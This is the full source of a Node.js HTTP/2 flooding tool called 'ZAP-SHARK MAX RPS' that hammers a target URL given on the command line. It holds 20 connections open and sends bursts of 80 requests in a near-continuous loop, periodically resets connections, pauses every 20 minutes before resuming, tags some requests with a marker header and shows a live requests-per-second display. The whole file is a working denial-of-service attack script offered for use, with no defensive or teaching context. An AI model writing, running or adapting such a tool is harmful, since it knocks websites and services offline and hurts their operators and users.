const http2 = require('http2');

class ZAPSHARK_MAX_RPS {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // HIGH PERFORMANCE
        this.connections = [];
        this.connectionCount = 20;
        
        // PAYLOAD
        this.payloadCounter = 0;
        this.nextPayloadAt = 1000000 + Math.floor(Math.random() * 4000000);
        
        // MAINTENANCE
        this.maintenanceStart = Date.now();
        this.inMaintenance = false;
        
        // STATS
        this.peakRPS = 0;
    }

    // SETUP CONNECTIONS
    setupConnections() {
        for (let i = 0; i < this.connectionCount; i++) {
            setTimeout(() => {
                try {
                    const client = http2.connect(this.targetUrl);
                    this.connections.push(client);
                } catch (err) {}
            }, i * 50);
        }
    }

    // ATTACK
    attack() {
        if (this.inMaintenance || this.connections.length === 0) return;
        
        // PAYLOAD CHECK
        this.payloadCounter++;
        const sendPayload = this.payloadCounter >= this.nextPayloadAt;
        if (sendPayload) {
            this.payloadCounter = 0;
            this.nextPayloadAt = 1000000 + Math.floor(Math.random() * 4000000);
        }
        
        // AGGRESSIVE ATTACK
        for (let i = 0; i < 80; i++) {
            const client = this.connections[Math.floor(Math.random() * this.connections.length)];
            if (!client) continue;
            
            try {
                const headers = {
                    ':method': 'GET',
                    ':path': '/'
                };
                
                if (sendPayload) {
                    headers['x-shark'] = 'T.Ø.Š-$HĀRKWIRE-TØR';
                }
                
                const req = client.request(headers);
                
                req.on('close', () => {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.on('error', () => {});
                
                req.end();
                
                // AUTO DESTROY
                setTimeout(() => {
                    try { req.destroy(); } catch (e) {}
                }, 100);
                
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
        
        // AUTO RESET EVERY 50K REQUESTS
        if (this.totalRequests % 50000 === 0) {
            this.resetSomeConnections();
        }
    }

    // RESET CONNECTIONS
    resetSomeConnections() {
        const resetCount = Math.min(5, this.connections.length);
        
        for (let i = 0; i < resetCount; i++) {
            const index = Math.floor(Math.random() * this.connections.length);
            try {
                this.connections[index].destroy();
                const newClient = http2.connect(this.targetUrl);
                this.connections[index] = newClient;
            } catch (err) {}
        }
    }

    // MAINTENANCE CHECK
    checkMaintenance() {
        const now = Date.now();
        if (now - this.maintenanceStart >= 1200000 && !this.inMaintenance) { // 20 mins
            this.startMaintenance();
        }
    }

    startMaintenance() {
        console.log('\n[!] 20 MINUTE MAINTENANCE [!]');
        this.inMaintenance = true;
        
        // DESTROY CONNECTIONS
        this.connections.forEach(c => {
            try { c.destroy(); } catch (e) {}
        });
        this.connections = [];
        
        // RESUME AFTER 20 MINS
        setTimeout(() => {
            this.endMaintenance();
        }, 1200000);
    }

    endMaintenance() {
        console.log('\n[+] RESUMING ATTACK [+]');
        this.inMaintenance = false;
        this.maintenanceStart = Date.now();
        this.setupConnections();
    }

    // STATS
    calculateRPS() {
        const now = Date.now();
        const elapsed = (now - this.lastRpsCalc) / 1000;
        
        if (elapsed >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / elapsed;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    displayStats() {
        this.calculateRPS();
        this.checkMaintenance();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const mins = Math.floor(runtime / 60);
        const secs = runtime % 60;
        
        const nextMaintenance = Math.max(0, 1200000 - (Date.now() - this.maintenanceStart));
        const maintMins = Math.floor(nextMaintenance / 60000);
        const maintSecs = Math.floor((nextMaintenance % 60000) / 1000);
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log('=== ZAP-SHARK MAX RPS ===');
        console.log(`RUNTIME: ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`);
        console.log('='.repeat(40));
        console.log(`REQUESTS: ${this.totalRequests.toLocaleString()}`);
        console.log(`RPS: ${this.currentRPS.toFixed(1)} | PEAK: ${this.peakRPS.toFixed(1)}`);
        console.log(`CONNECTIONS: ${this.connections.length}`);
        console.log(`NEXT PAYLOAD: ${(this.nextPayloadAt - this.payloadCounter).toLocaleString()}`);
        console.log(`NEXT MAINT: ${maintMins}m ${maintSecs}s`);
        console.log('='.repeat(40));
    }

    // START
    start() {
        console.log('=== ZAP-SHARK MAX RPS ===');
        console.log('Target:', this.targetUrl);
        console.log('='.repeat(40));
        
        this.setupConnections();
        
        setTimeout(() => {
            // ATTACK LOOP
            const attackLoop = setInterval(() => {
                if (!this.inMaintenance) {
                    this.attack();
                }
            }, 0.05);
            
            // DISPLAY LOOP
            const displayLoop = setInterval(() => {
                this.displayStats();
            }, 100);
            
            // EXIT HANDLER
            process.on('SIGINT', () => {
                clearInterval(attackLoop);
                clearInterval(displayLoop);
                
                console.log('\n\n=== FINAL STATS ===');
                console.log(`Requests: ${this.totalRequests.toLocaleString()}`);
                console.log(`Peak RPS: ${this.peakRPS.toFixed(1)}`);
                console.log(`Runtime: ${Math.floor((Date.now() - this.startTime) / 1000)}s`);
                console.log('='.repeat(40));
                
                this.connections.forEach(c => {
                    try { c.destroy(); } catch (e) {}
                });
                
                process.exit(0);
            });
            
        }, 2000);
    }
}

// RUN
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node shark.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_MAX_RPS(target);
shark.start();
